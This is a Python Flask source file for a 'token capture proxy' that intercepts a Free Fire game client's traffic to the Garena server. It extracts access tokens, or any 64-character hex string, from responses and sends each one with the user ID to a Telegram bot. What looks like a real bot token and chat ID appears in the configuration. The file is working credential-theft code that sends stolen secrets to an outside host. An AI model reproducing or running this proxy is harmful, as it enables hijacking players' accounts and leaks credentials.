from flask import Flask, request, jsonify, Response
import requests
import os
import re
import json
from datetime import datetime

app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
# The real Garena server URL (from your earlier JSON)
REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')

# Telegram alerts (optional) – set these in Render environment variables
TELEGRAM_BOT_TOKEN = os.environ.get('8199355245:AAEXNVzd9lZUv5fvT9axmJ3rNbcSPUh56QA', '')
TELEGRAM_CHAT_ID = os.environ.get('6261108215', '')
# ─────────────────────────────────────────────────────────────────

def send_telegram(msg):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"})
    except:
        pass

@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def proxy(user_id, subpath):
    """
    Forward all requests to the real Garena server,
    capture the response, extract the hex access token.
    """
    # ── Build the real URL ──
    if subpath:
        real_url = f"{REAL_SERVER}/user/{user_id}/{subpath}"
    else:
        real_url = f"{REAL_SERVER}/user/{user_id}/"

    print(f"\n🔹 Proxying {request.method} {real_url}")

    # ── Forward request ──
    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
    headers.pop('Content-Length', None)  # let requests set it

    try:
        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
    except Exception as e:
        print(f"❌ Proxy error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

    print(f"   Response status: {resp.status_code}")

    # ── Extract hex access token ──
    hex_token = None
    try:
        data = resp.json()
        hex_token = data.get('access_token')
        if hex_token:
            print(f"✅ HEX ACCESS TOKEN CAPTURED: {hex_token}")
            send_telegram(
                f"🎯 <b>Hex Token!</b>\n"
                f"User: {user_id}\n"
                f"Token: <code>{hex_token}</code>"
            )
        else:
            print("   No 'access_token' in JSON response.")
    except:
        # Not JSON – search raw text for 64‑char hex
        raw_body = resp.text
        hex_pattern = re.compile(r'[0-9a-fA-F]{64}')
        matches = hex_pattern.findall(raw_body)
        if matches:
            hex_token = matches[0]
            print(f"✅ HEX TOKEN FOUND IN RAW: {hex_token}")
            send_telegram(
                f"🎯 <b>Hex Token (raw)</b>\n"
                f"User: {user_id}\n"
                f"Token: <code>{hex_token}</code>"
            )
        else:
            print("   No hex token found in response.")

    # ── Return the real server's response back to the game ──
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    response_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded_headers]

    return Response(
        resp.content,
        status=resp.status_code,
        headers=response_headers
    )

@app.route('/')
def home():
    return "Token capture proxy is running!", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)